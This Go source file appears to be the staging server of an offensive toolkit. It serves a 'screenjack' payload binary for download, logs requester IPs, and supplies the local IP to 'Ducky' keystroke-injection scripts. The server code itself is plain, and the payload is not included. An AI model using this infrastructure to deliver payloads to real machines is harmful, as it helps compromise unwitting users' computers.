package main

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type LogEntry struct {
	Time   time.Time
	Method string
	Path   string
	Status int
	IP     string
}

type Server struct {
	srv         *http.Server
	port        int
	running     bool
	payloadPath string
	assetPath   string
	logs        []LogEntry
	mu          sync.Mutex
}

func NewServer() *Server {
	return &Server{port: 8000}
}

func (s *Server) log(method, path string, status int, ip string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logs = append(s.logs, LogEntry{
		Time:   time.Now(),
		Method: method,
		Path:   path,
		Status: status,
		IP:     ip,
	})
	// Keep last 50 entries
	if len(s.logs) > 50 {
		s.logs = s.logs[len(s.logs)-50:]
	}
}

func (s *Server) Logs() []LogEntry {
	s.mu.Lock()
	defer s.mu.Unlock()
	cp := make([]LogEntry, len(s.logs))
	copy(cp, s.logs)
	return cp
}

func (s *Server) ClearLogs() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logs = nil
}

func (s *Server) Start(payloadPath, assetPath string) error {
	if s.running {
		return nil
	}

	s.payloadPath = payloadPath
	s.assetPath = assetPath
	s.logs = nil

	mux := http.NewServeMux()

	// Logging wrapper
	logWrap := func(path string, handler http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			ip := r.RemoteAddr
			if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
				ip = fwd
			}
			handler(w, r)
			s.log(r.Method, path, 200, ip)
		}
	}

	// Serve payload
	payloadName := filepath.Base(payloadPath)
	mux.HandleFunc("/"+payloadName, logWrap("/"+payloadName, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Disposition", "attachment; filename="+payloadName)
		http.ServeFile(w, r, payloadPath)
	}))

	// Serve asset if set
	if assetPath != "" {
		assetName := filepath.Base(assetPath)
		mux.HandleFunc("/"+assetName, logWrap("/"+assetName, func(w http.ResponseWriter, r *http.Request) {
			http.ServeFile(w, r, assetPath)
		}))
	}

	// Index page
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		ip := r.RemoteAddr
		if r.URL.Path != "/" {
			s.log(r.Method, r.URL.Path, 404, ip)
			http.NotFound(w, r)
			return
		}
		s.log(r.Method, "/", 200, ip)
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "<h1>screenjack</h1>")
		fmt.Fprintf(w, "<p><a href=\"/%s\">%s</a></p>", filepath.Base(payloadPath), filepath.Base(payloadPath))
		if assetPath != "" {
			fmt.Fprintf(w, "<p><a href=\"/%s\">%s</a></p>", filepath.Base(assetPath), filepath.Base(assetPath))
		}
	})

	s.srv = &http.Server{
		Addr:    fmt.Sprintf(":%d", s.port),
		Handler: mux,
	}

	ln, err := net.Listen("tcp", s.srv.Addr)
	if err != nil {
		return err
	}

	s.running = true
	go s.srv.Serve(ln)
	return nil
}

func (s *Server) Stop() {
	if !s.running || s.srv == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	s.srv.Shutdown(ctx)
	s.running = false
}

func (s *Server) IsRunning() bool {
	return s.running
}

func (s *Server) Port() int {
	return s.port
}

func (s *Server) SetPort(p int) {
	s.port = p
}

// GetLocalIP returns the local IP for Ducky scripts
func GetLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}

// PayloadExists checks if payload binary exists
func PayloadExists(targetOS string) (string, bool) {
	var path string
	if targetOS == "windows" {
		path = "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
	} else {
		path = "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"
	}
	_, err := os_stat(path)
	return path, err == nil
}

var os_stat = os.Stat
